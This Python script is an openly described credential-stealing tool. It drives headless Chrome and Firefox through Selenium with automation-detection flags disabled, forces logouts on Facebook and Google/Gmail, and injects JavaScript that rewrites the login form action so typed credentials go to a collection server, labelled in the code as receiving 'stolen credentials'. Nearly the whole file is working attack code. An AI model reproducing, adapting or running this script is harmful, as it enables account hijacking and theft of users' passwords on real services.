import time
import random
from urllib.parse import urlparse, quote

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager

# Target server to receive stolen credentials
server = "http://localhost:8080/"

# Sites to hijack
target_sites = {
    'www.facebook.com': {
        'logout_url': None,
        'logout_form': 'logout_form',
        'login_form_index': 0,
        'owned': False
    },
    'accounts.google.com': {
        'logout_url': 'https://accounts.google.com/logout',
        'logout_form': None,
        'login_form_index': 0,
        'owned': False
    }
}

# Extend to Gmail subdomains
target_sites["www.gmail.com"] = target_sites['accounts.google.com']
target_sites["mail.google.com"] = target_sites['accounts.google.com']


def wait_for_browser():
    time.sleep(random.uniform(3, 7))


def intercept_browser(driver, parsed_url):
    hostname = parsed_url.hostname
    if hostname not in target_sites:
        return

    site = target_sites[hostname]

    if site["owned"]:
        return

    print(f"[+] Intercepting browser session for {hostname}")

    # Force logout
    if site["logout_url"]:
        driver.get(site["logout_url"])
        wait_for_browser()
    else:
        try:
            elements = driver.find_elements(By.XPATH, "//*")
            for element in elements:
                try:
                    if element.get_attribute("id") == site["logout_form"]:
                        element.submit()
                        wait_for_browser()
                        break
                except Exception:
                    continue
        except Exception:
            pass

    # Inject malicious form action
    try:
        login_index = site['login_form_index']
        encoded_url = quote(driver.current_url)
        script = f"document.forms[{login_index}].action = '{server}{encoded_url}';"
        driver.execute_script(script)
        site["owned"] = True
        print(f"[+] Injected malicious login redirect for {hostname}")
    except Exception as e:
        print(f"[!] Failed to inject login redirect for {hostname}: {e}")


def setup_drivers():
    drivers = []

    try:
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=1920x1080")
        chrome_options.add_argument("--user-agent=Mozilla/5.0")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)

        chrome_driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=chrome_options)
        drivers.append(chrome_driver)
    except Exception as e:
        print(f"[!] Failed to launch Chrome: {e}")

    try:
        firefox_options = webdriver.FirefoxOptions()
        firefox_options.headless = True
        firefox_driver = webdriver.Firefox(service=FirefoxService(GeckoDriverManager().install()), options=firefox_options)
        drivers.append(firefox_driver)
    except Exception as e:
        print(f"[!] Failed to launch Firefox: {e}")

    return drivers


def main():
    drivers = setup_drivers()
    if not drivers:
        print("[!] No browsers were successfully initialized.")
        return

    print("[*] Monitoring browsers...")

    try:
        while True:
            for driver in drivers:
                try:
                    current_url = driver.current_url
                    parsed_url = urlparse(current_url)
                    intercept_browser(driver, parsed_url)
                except Exception:
                    continue
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Closing browsers...")
    finally:
        for driver in drivers:
            driver.quit()


if __name__ == "__main__":
    main()
